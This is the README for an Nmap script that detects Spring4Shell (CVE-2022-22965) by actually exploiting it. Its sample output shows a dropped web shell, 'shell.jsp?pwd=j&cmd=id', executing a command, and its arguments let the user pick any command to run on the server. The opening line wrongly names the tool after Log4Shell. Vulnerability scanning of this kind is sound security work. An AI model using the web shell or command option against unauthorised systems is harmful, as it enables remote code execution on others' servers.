# nmap-spring4shell
Log4shell-nmap is an NSE script for detecting Spring4Shell RCE vulnerabilities (CVE-2022-22965) in HTTP services. The script injects the correct payload into the application and then executes the following command on the specified (default "/") endpoint.

## Vulnerability
See (here)[https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/].

## Usage
```
┌──(kali㉿kali)-[~/nmap-spring4shell]
└─$ nmap 127.0.0.1 --script=./spring4shell.nse
(...)
PORT     STATE SERVICE    REASON  VERSION
8080/tcp open  http-proxy syn-ack
| spring4shell: 
|   VULNERABLE:
|   Spring4Shell - Spring Framework RCE via Data Binding on JDK 9+
|     State: VULNERABLE
|     IDs:  CVE:CVE-2022-22965
|     Check results:
|       127.0.0.1:8080/shell.jsp?pwd=j&cmd=id
|     Extra information:
|       TESTED URL: 127.0.0.1:8080
|       COMMAND: id
|       ASSERTION: uid
|     References:
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965
```

## Arguments
We can use several variables in the script. These are as follows:
- endpoint - relative url. On https://bugspace.pl/search/videos it will be '/search/videos',
- command - command to be run on the server.  The default command is "id",
- assertion - the checked string inside the server response. The default assertion is "uid",
- filename - file name on the server. For more information see (here)[https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/]. The default name is shell.

## Sources to check
https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/

## License
Same as Nmap--See https://nmap.org/book/man-legal.html
